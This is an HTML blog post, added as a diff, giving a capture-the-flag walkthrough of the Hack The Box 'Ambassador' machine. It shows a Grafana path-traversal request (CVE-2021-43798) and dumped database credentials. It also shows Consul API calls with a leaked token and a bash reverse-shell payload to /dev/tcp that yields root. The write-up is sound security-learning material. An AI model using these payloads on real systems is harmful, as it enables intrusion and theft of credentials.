@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Ambassador -Hack The Box - Blog</title><meta name="Description" content=""><meta property="og:title" content="Ambassador -Hack The Box" />
+<meta property="og:description" content="Summary Starting with a public exploit in Grafana, which is an unauthenticated path-travesel, leads to dumping sqlite data.We obtained a MySQL remote access credential from that dump and the SSH credential from the MySQL databases. taking ssh and finding a internal project in the /opt directory.Checking the git commits of the project, it leaks a token of the Consul app and has an API service listening internally and running as root, registering a service using the leaked token via the Consul API for root access." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://elf1337.github.io/ambassador/" /><meta property="og:image" content="https://elf1337.github.io/posts/ambassador.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-27T13:43:40+00:00" />
+<meta property="article:modified_time" content="2023-01-27T13:43:40+00:00" /><meta property="og:site_name" content="Blog by a security researcher" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://elf1337.github.io/posts/ambassador.png"/>
+
+<meta name="twitter:title" content="Ambassador -Hack The Box"/>
+<meta name="twitter:description" content="Summary Starting with a public exploit in Grafana, which is an unauthenticated path-travesel, leads to dumping sqlite data.We obtained a MySQL remote access credential from that dump and the SSH credential from the MySQL databases. taking ssh and finding a internal project in the /opt directory.Checking the git commits of the project, it leaks a token of the Consul app and has an API service listening internally and running as root, registering a service using the leaked token via the Consul API for root access."/>
+<meta name="application-name" content="Blog">
+<meta name="apple-mobile-web-app-title" content="Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="https://elf1337.github.io/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="https://elf1337.github.io/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="https://elf1337.github.io/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="https://elf1337.github.io/apple-touch-icon.png"><link rel="mask-icon" href="https://elf1337.github.io/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="https://elf1337.github.io/site.webmanifest"><link rel="canonical" href="https://elf1337.github.io/ambassador/" /><link rel="prev" href="https://elf1337.github.io/updown/" /><link rel="stylesheet" href="https://elf1337.github.io/lib/normalize/normalize.min.css"><link rel="stylesheet" href="https://elf1337.github.io/css/style.min.css"><link rel="stylesheet" href="https://elf1337.github.io/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="https://elf1337.github.io/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Ambassador -Hack The Box",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/elf1337.github.io\/ambassador\/"
+        },"genre": "posts","wordcount":  1109 ,
+        "url": "https:\/\/elf1337.github.io\/ambassador\/","datePublished": "2023-01-27T13:43:40+00:00","dateModified": "2023-01-27T13:43:40+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Akhil"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="https://elf1337.github.io/" title="Blog">Home</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="https://elf1337.github.io/posts/"> Posts </a><a class="menu-item" href="https://elf1337.github.io/tags/"> Tags </a><a class="menu-item" href="https://elf1337.github.io/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="https://elf1337.github.io/" title="Blog">Home</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="https://elf1337.github.io/posts/" title="">Posts</a><a class="menu-item" href="https://elf1337.github.io/tags/" title="">Tags</a><a class="menu-item" href="https://elf1337.github.io/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Ambassador -Hack The Box</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://elf1337.github.io/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Akhil</a>
+</span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-01-27">2023-01-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1109 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="https://elf1337.github.io/svg/loading.min.svg"
+        data-src="https://elf1337.github.io/img/ambassador.png"
+        data-srcset="https://elf1337.github.io/img/ambassador.png, https://elf1337.github.io/img/ambassador.png 1.5x, https://elf1337.github.io/img/ambassador.png 2x"
+        data-sizes="auto"
+        alt="/img/ambassador.png"
+        title="/img/ambassador.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#summary">Summary</a></li>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#web-services">Web services</a></li>
+        <li><a href="#cve-2021-43798">CVE-2021-43798</a></li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#mysql">MySQL</a></li>
+      </ul>
+    </li>
+    <li><a href="#ssh-as-developer">SSH as developer</a></li>
+    <li><a href="#privilege-escalation">Privilege escalation</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="summary">Summary</h2>
+<p>Starting with a public exploit in Grafana, which is an unauthenticated path-travesel, leads to dumping sqlite data.We obtained a MySQL remote access credential from that dump and the SSH credential from the MySQL databases. taking ssh and finding a internal project in the /opt directory.Checking the git commits of the project, it leaks a token of the Consul app and has an API service listening internally and running as root, registering a service using the leaked token via the Consul API for root access.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Initial nmap port scan</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+3000/tcp open  ppp?
+3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
+</code></pre></td></tr></table>
+</div>
+</div><p>We had more ports open than usual this time.</p>
+<h3 id="web-services">Web services</h3>
+<p>First we connect to port 80 it is running a static site build with hugo. It has a post message for newly
+joined developers.</p>
+<p><img
+        class="lazyload"
+        src="https://elf1337.github.io/svg/loading.min.svg"
+        data-src="https://elf1337.github.io/img/ambassador-web.png"
+        data-srcset="https://elf1337.github.io/img/ambassador-web.png, https://elf1337.github.io/img/ambassador-web.png 1.5x, https://elf1337.github.io/img/ambassador-web.png 2x"
+        data-sizes="auto"
+        alt="/img/ambassador-web.png"
+        title="image" /></p>
+<p>The post reveal their is an developer account for connecting ssh. Username is <strong>developer</strong>. Fuzzing hidden directory we can&rsquo;t find anything.</p>
+<p>Connecting to port 3000 we can see a grafana login page.</p>
+<p><img
+        class="lazyload"
+        src="https://elf1337.github.io/svg/loading.min.svg"
+        data-src="https://elf1337.github.io/img/ambassador-grafana.png"
+        data-srcset="https://elf1337.github.io/img/ambassador-grafana.png, https://elf1337.github.io/img/ambassador-grafana.png 1.5x, https://elf1337.github.io/img/ambassador-grafana.png 2x"
+        data-sizes="auto"
+        alt="/img/ambassador-grafana.png"
+        title="image" /></p>
+<blockquote>
+<p>Grafana is a multi-platform open source analytics and interactive visualization web application. It provides charts, graphs, and alerts for the web when connected to supported data sources</p>
+</blockquote>
+<h3 id="cve-2021-43798">CVE-2021-43798</h3>
+<p>From the above image, we can see the version of Grafana v8.2.0 (d7f71e9eae). While searching for public exploits in exploitDB <a href="https://www.exploit-db.com/exploits/50581" target="_blank" rel="noopener noreffer">https://www.exploit-db.com/exploits/50581</a>
+, we came across one Grafana versions 8.0.0-beta1 through 8.3.0 are vulnerable to directory traversal, allowing access to local files. A more detailed blog can be found here: <a href="https://j0vsec.com/post/cve-2021-43798/" target="_blank" rel="noopener noreffer">https://j0vsec.com/post/cve-2021-43798/</a>
+</p>
+<p>We can now read any file with this exploit and have moved on to a more sensitive file. Grafana&rsquo;s default configuration makes use of sqlite3, and the database file is located at /var/lib/grafana/grafana.db.</p>
+<p>Downloading the grafanadb using curl</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl --path-as-is <span class="s2">&#34;http://10.129.208.1:3000/public/plugins/state-timeline/../../../../../../../../../../../../../var/lib/grafana/grafana.db&#34;</span> -O grafana.db
+</code></pre></td></tr></table>
+</div>
+</div><p>Open the db file with a sqlite viewer.</p>
+<p><img
+        class="lazyload"
+        src="https://elf1337.github.io/svg/loading.min.svg"
+        data-src="https://elf1337.github.io/img/ambassador-sqlite.png"
+        data-srcset="https://elf1337.github.io/img/ambassador-sqlite.png, https://elf1337.github.io/img/ambassador-sqlite.png 1.5x, https://elf1337.github.io/img/ambassador-sqlite.png 2x"
+        data-sizes="auto"
+        alt="/img/ambassador-sqlite.png"
+        title="image" /></p>
+<p>We found mysql creds from data_source table.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="mysql">MySQL</h3>
+<p>Connecting to mysql</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; show databases<span class="p">;</span>
++--------------------+
+<span class="p">|</span> Database           <span class="p">|</span>
++--------------------+
+<span class="p">|</span> grafana            <span class="p">|</span>
+<span class="p">|</span> information_schema <span class="p">|</span>
+<span class="p">|</span> mysql              <span class="p">|</span>
+<span class="p">|</span> performance_schema <span class="p">|</span>
+<span class="p">|</span> sys                <span class="p">|</span>
+<span class="p">|</span> whackywidget       <span class="p">|</span>
++--------------------+
+<span class="m">6</span> rows in <span class="nb">set</span> <span class="o">(</span>0.08 sec<span class="o">)</span>
+
+mysql&gt; use whackywidget<span class="p">;</span>
+Reading table information <span class="k">for</span> completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; show tables<span class="p">;</span>
++------------------------+
+<span class="p">|</span> Tables_in_whackywidget <span class="p">|</span>
++------------------------+
+<span class="p">|</span> users                  <span class="p">|</span>
++------------------------+
+<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.07 sec<span class="o">)</span>
+
+mysql&gt; <span class="k">select</span> * from users<span class="p">;</span>
++-----------+------------------------------------------+
+<span class="p">|</span> user      <span class="p">|</span> pass                                     <span class="p">|</span>
++-----------+------------------------------------------+
+<span class="p">|</span> developer <span class="p">|</span> <span class="nv">YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg</span><span class="o">==</span> <span class="p">|</span>
++-----------+------------------------------------------+
+<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.07 sec<span class="o">)</span>
+
+mysql&gt; 
+</code></pre></td></tr></table>
+</div>
+</div><p>We found the WhackyWidget database inside the database&rsquo;s user table. We got the credentials for SSH, and the password was stored in Base64 format.</p>
+<h2 id="ssh-as-developer">SSH as developer</h2>
+<p>Decode the password and connected to ssh</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@ambassador:~$ id <span class="o">&amp;&amp;</span> ls
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>developer<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>developer<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>developer<span class="o">)</span>
+snap  user.txt
+developer@ambassador:~$ 
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege escalation</h2>
+<p>We found a project in /opt directory that uses git to manage the project.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@ambassador:/opt/my-app$ ls -la
+total <span class="m">24</span>
+drwxrwxr-x <span class="m">5</span> root root <span class="m">4096</span> Mar <span class="m">13</span>  <span class="m">2022</span> .
+drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Sep  <span class="m">1</span> 22:13 ..
+drwxrwxr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">13</span>  <span class="m">2022</span> env
+drwxrwxr-x <span class="m">8</span> root root <span class="m">4096</span> Mar <span class="m">14</span>  <span class="m">2022</span> .git
+-rw-rw-r-- <span class="m">1</span> root root <span class="m">1838</span> Mar <span class="m">13</span>  <span class="m">2022</span> .gitignore
+drwxrwxr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">13</span>  <span class="m">2022</span> whackywidget
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking at the git logs and if we look at the last commit. It removes a token that was used for consul services.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@ambassador:/opt/my-app$ git log --oneline
+33a53ef <span class="o">(</span>HEAD -&gt; main<span class="o">)</span> tidy config script
+c982db8 config script
+8dce657 created project with django CLI
+4b8597b .gitignore
+developer@ambassador:/opt/my-app$ git show 33a53ef
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c <span class="o">(</span>HEAD -&gt; main<span class="o">)</span>
+Author: Developer &lt;developer@ambassador.local&gt;
+Date:   Sun Mar <span class="m">13</span> 23:47:36 <span class="m">2022</span> +0000
+
+    tidy config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+index 35c08f6..fc51ec0 <span class="m">100755</span>
+--- a/whackywidget/put-config-in-consul.sh
++++ b/whackywidget/put-config-in-consul.sh
+@@ -1,4 +1,4 @@
+ <span class="c1"># We use Consul for application config in production, this script will help set the correct values for the app</span>
+-# Export MYSQL_PASSWORD before running
++# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+ 
+-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw <span class="nv">$MYSQL_PASSWORD</span>
++consul kv put whackywidget/db/mysql_pw <span class="nv">$MYSQL_PASSWORD</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking more on consul.</p>
+<blockquote>
+<p>HashiCorp Consul is a service networking solution that enables teams to manage secure network connectivity between services and across on-prem and multi-cloud environments and runtimes. Consul offers service discovery, service mesh, traffic management, and automated updates to network infrastructure device. You can use these features individually or together in a single Consul deployment.</p>
+</blockquote>
+<p>Consul on this box running as root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@ambassador:/opt/my-app$ ps aux <span class="p">|</span> grep consul 
+root        <span class="m">1093</span>  0.2  3.8 <span class="m">794292</span> <span class="m">76364</span> ?        Ssl  06:01   0:15 /usr/bin/consul agent -config-dir<span class="o">=</span>/etc/consul.d/config.d -config-file<span class="o">=</span>/etc/consul.d/consul.hcl
+</code></pre></td></tr></table>
+</div>
+</div><p>Port numbers starting with &ldquo;8&rdquo; belong to consular services.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">developer@ambassador:/opt/my-app$ ss -lnpt
+State             Recv-Q            Send-Q                        Local Address:Port                          Peer Address:Port            Process            
+LISTEN            <span class="m">0</span>                 <span class="m">70</span>                                127.0.0.1:33060                              0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">151</span>                                 0.0.0.0:3306                               0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">4096</span>                              127.0.0.1:8300                               0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">4096</span>                              127.0.0.1:8301                               0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">4096</span>                              127.0.0.1:8302                               0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">4096</span>                              127.0.0.1:8500                               0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">4096</span>                          127.0.0.53%lo:53                                 0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">128</span>                                 0.0.0.0:22                                 0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">4096</span>                              127.0.0.1:8600                               0.0.0.0:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">511</span>                                       *:80                                       *:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">128</span>                                    <span class="o">[</span>::<span class="o">]</span>:22                                    <span class="o">[</span>::<span class="o">]</span>:*                                  
+LISTEN            <span class="m">0</span>                 <span class="m">4096</span>                                      *:3000                                     *:*                   
+</code></pre></td></tr></table>
+</div>
+</div><p>What we can do is use the leaked token to register a service on the Consul agent by using the Consul http API listening on port 8500 and putting our payload in service configuration. While the consul executes the services, it triggers our payload as root.</p>
+<p>Referance API doc <a href="https://www.consul.io/api-docs/agent/service" target="_blank" rel="noopener noreffer">https://www.consul.io/api-docs/agent/service</a>
+<br>
+Referance about default port <a href="https://stackoverflow.com/questions/30684262/different-ports-used-by-consul" target="_blank" rel="noopener noreffer">https://stackoverflow.com/questions/30684262/different-ports-used-by-consul</a>
+</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># listing avilable services</span>
+curl http://127.0.0.1:8500/v1/agent/services -H <span class="s2">&#34;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Create a configuration file rce.json with args as our reverse shell payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="o">{</span>
+  <span class="s2">&#34;ID&#34;</span>: <span class="s2">&#34;rce3&#34;</span>,
+  <span class="s2">&#34;Name&#34;</span>: <span class="s2">&#34;rce3&#34;</span>,
+  <span class="s2">&#34;Tags&#34;</span>: <span class="o">[</span><span class="s2">&#34;primary&#34;</span>, <span class="s2">&#34;v1&#34;</span><span class="o">]</span>,
+  <span class="s2">&#34;Address&#34;</span>: <span class="s2">&#34;127.0.0.1&#34;</span>,
+  <span class="s2">&#34;Port&#34;</span>: 80,
+  <span class="s2">&#34;Check&#34;</span>: <span class="o">{</span>
+    <span class="s2">&#34;Args&#34;</span>: <span class="o">[</span><span class="s2">&#34;bash&#34;</span>, <span class="s2">&#34;-c&#34;</span>, <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.6/9001 0&gt;&amp;1&#34;</span><span class="o">]</span>,
+    <span class="s2">&#34;Interval&#34;</span>: <span class="s2">&#34;10s&#34;</span>,
+    <span class="s2">&#34;Timeout&#34;</span>: <span class="s2">&#34;86400s&#34;</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Registering new services</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl -X PUT http://127.0.0.1:8500/v1/agent/services/register <span class="se">\
+</span><span class="se"></span>          -H <span class="s2">&#34;X-Consul-Token: bb03b43b-1d81-d62b-24b5-39540ee469b5&#34;</span> <span class="se">\
+</span><span class="se"></span>          --data @rce.json
+</code></pre></td></tr></table>
+</div>
+</div><p>Wait to tigger the payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo netcat -lvnp <span class="m">9001</span>
+Listening on 0.0.0.0 <span class="m">443</span>
+Connection received on 10.10.11.183
+root@ambassador:/# id      
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We got a reverse shell as root</p>
+<p>Thank you for reading my blog; I hope you enjoyed it.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-01-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="https://elf1337.github.io/ambassador/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://elf1337.github.io/ambassador/" data-title="Ambassador -Hack The Box" data-via="akhil0x8"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://elf1337.github.io/ambassador/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://elf1337.github.io/ambassador/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="https://elf1337.github.io/ambassador/" data-title="Ambassador -Hack The Box" data-web><i class="fab fa-whatsapp fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://elf1337.github.io/ambassador/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="https://elf1337.github.io/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="https://elf1337.github.io/updown/" class="prev" rel="prev" title="Updown -Hack The Box"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Updown -Hack The Box</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
